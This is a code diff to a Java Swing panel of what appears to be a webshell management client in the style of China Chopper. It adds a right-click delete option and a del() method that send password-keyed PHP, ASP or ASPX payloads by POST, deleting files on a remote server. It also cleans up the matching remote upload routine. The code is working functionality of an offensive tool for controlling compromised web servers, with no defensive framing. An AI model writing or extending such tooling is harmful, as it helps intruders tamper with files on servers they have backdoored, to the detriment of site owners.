@@ -60,6 +60,7 @@ public class WebmanagePanel extends JPanel {
     private JPopupMenu tableMenu  ;
     private JScrollPane scrollPane;
     private Main main;
+    private String SelectPath ="";
 	/**
 	 * Create the panel.
 	 * @param password 
@@ -102,6 +103,7 @@ public class WebmanagePanel extends JPanel {
 		
 		tableMenu  = new JPopupMenu();
 		JMenuItem uploadMenu = new JMenuItem("上传");
+		JMenuItem delMenu = new JMenuItem("删除");
 		uploadMenu.addActionListener(new ActionListener() {
 			@Override
 			public void actionPerformed(ActionEvent arg0) {
@@ -109,7 +111,6 @@ public class WebmanagePanel extends JPanel {
 				JFileChooser jfc = new JFileChooser();
 				jfc.setFileSelectionMode(JFileChooser.FILES_AND_DIRECTORIES );  
 				jfc.showDialog(table, "open");
-				System.out.println(11);
 				String filePath = jfc.getSelectedFile().toPath().toString();
 				String name = jfc.getSelectedFile().getName();
 				String fileval = WebmanagePanel.this.main.getFileIO().read(filePath);
@@ -121,8 +122,24 @@ public class WebmanagePanel extends JPanel {
 				}
 			}
 		});
-		tableMenu.add(uploadMenu);
+		delMenu.addActionListener(new ActionListener() {
+			
+			@Override
+			public void actionPerformed(ActionEvent e) {
+				// TODO Auto-generated method stub
+				if(SelectPath!=null && SelectPath.length()>0){
+					try {
+						del(SelectPath);
+					} catch (UnsupportedEncodingException e1) {
+						// TODO Auto-generated catch block
+						e1.printStackTrace();
+					}
+				}
+			}
+		});
 		
+		tableMenu.add(uploadMenu);
+		tableMenu.add(delMenu);
 		table.addMouseListener(new MouseAdapter() {
 			@Override
 			public void mousePressed(MouseEvent arg0) {
@@ -143,7 +160,8 @@ public class WebmanagePanel extends JPanel {
 				if(e.getButton()==MouseEvent.BUTTON3){
 					int row = table.rowAtPoint(e.getPoint());
 					table.setRowSelectionInterval(row, row);
-					tableMenu.show(scrollPane, e.getX(),e.getY());
+					SelectPath = path.getText()+"/"+table.getValueAt(row, 1);
+					tableMenu.show(table, e.getX()+10,e.getY());
 				}
 			}
 		});
@@ -267,6 +285,29 @@ public class WebmanagePanel extends JPanel {
 		createTable(temp);//穿件右边列表
 		path_AddTree(path_createTreeNode(path.getText()), temp);;//目录树同步
 	}
+	private void del(String path) throws UnsupportedEncodingException{
+		postText = password+"=";
+		if(scriptType.toUpperCase().equals("PHP")){
+			path = base64.encodeBase64(path.getBytes());
+			path = URLEncoder.encode(path, "UTF-8");
+			postText = postText+payload.get(scriptType.toUpperCase()+"_MAKE")+"&"+payload.get("ACTION")+"="+payload.get(scriptType.toUpperCase()+"_DELETE")+"&"+payload.get("PARAM1")+"="+path;
+		}else if(scriptType.toUpperCase().equals("ASP")){
+			postText = password+"="+payload.get(scriptType.toUpperCase()+"_MAKE");
+			postText = postText.replace("PAYLOAD",payload.get(scriptType.toUpperCase()+"_DELETE"));
+			postText = postText+"&"+payload.get("PARAM1")+"="+URLEncoder.encode(path, "UTF-8");
+		}else if(scriptType.toUpperCase().equals("ASPX")){
+			path = URLEncoder.encode(path, "UTF-8");
+			postText = password+"="+payload.get(scriptType.toUpperCase()+"_DELETE");
+			postText = postText+"&"+payload.get("PARAM1")+"="+path;
+		}
+		String resValue = http.postSend(url, postText);
+		String temp[] = analysisClass.resultAnalysis(resValue, null);
+		if(temp!=null && temp.length>0 &&temp[0].equals("1")){
+			status.setText("删除成功");
+		}else{
+			status.setText("删除失败");
+		}
+	}
 	private void upload(String remotePath,String values) throws UnsupportedEncodingException{
 		if(scriptType.toUpperCase().equals("PHP")){
 			String path = base64.encodeBase64(remotePath.getBytes());
@@ -278,12 +319,8 @@ public class WebmanagePanel extends JPanel {
 			postText = postText.replace("PAYLOAD",payload.get(scriptType.toUpperCase()+"_UPLOAD"));
 			postText = postText+"&"+payload.get("PARAM1")+"="+base64.str2HexStr(remotePath)+"&"+payload.get("PARAM2")+"="+base64.str2HexStr(values);
 		}else if(scriptType.toUpperCase().equals("ASPX")){
-			System.out.println(remotePath);
-			//byte[] temp = remotePath.getBytes("GBK");
-			//remotePath = new String(temp, "UTF-8");
 			String path = base64.encodeBase64(remotePath.getBytes());
 			path = URLEncoder.encode(path, "UTF-8");
-			System.out.println(path);
 			postText = password+"="+payload.get(scriptType.toUpperCase()+"_UPLOAD");
 			postText = postText+"&"+payload.get("PARAM1")+"="+path+"&"+payload.get("PARAM2")+"="+base64.str2HexStr(values);
 		}
@@ -342,6 +379,7 @@ public class WebmanagePanel extends JPanel {
 	}
 	//目录树
 	public void path_AddTree(DefaultMutableTreeNode path,String[] values){
+		path.removeAllChildren();
 		String[] addTemp = null;
 		for(int i =0 ;i<values.length;i++){
 			if(values[i].indexOf("../")==-1 && values[i].indexOf("./")==-1){
